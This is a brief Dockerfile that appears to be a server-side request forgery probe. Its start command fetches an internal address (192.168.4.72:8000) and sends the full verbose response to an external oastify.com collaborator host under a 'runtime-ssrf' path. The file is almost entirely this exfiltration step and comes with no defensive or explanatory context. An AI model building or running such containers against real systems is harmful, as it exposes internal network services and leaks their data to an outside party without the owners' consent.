FROM alpine
RUN apk add --no-cache curl
CMD C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
 curl -vs http://192.168.4.72:8000 2>&1 | curl -s "$C/runtime-ssrf" --data-binary @-
